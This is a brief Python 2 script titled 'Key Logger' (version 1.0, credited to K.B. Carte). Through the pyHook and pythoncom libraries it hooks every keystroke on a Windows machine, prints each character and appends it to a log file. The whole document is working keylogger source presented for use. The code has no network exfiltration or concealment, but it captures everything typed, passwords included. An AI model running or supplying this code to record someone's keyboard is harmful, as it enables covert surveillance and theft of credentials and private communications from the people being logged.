#Key Logger
#By: K.B. Carte
#Version 1.0
################
import pythoncom, pyHook, sys, logging

LOG_FILENAME = 'path\to\log.out'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    print "Key: ", chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()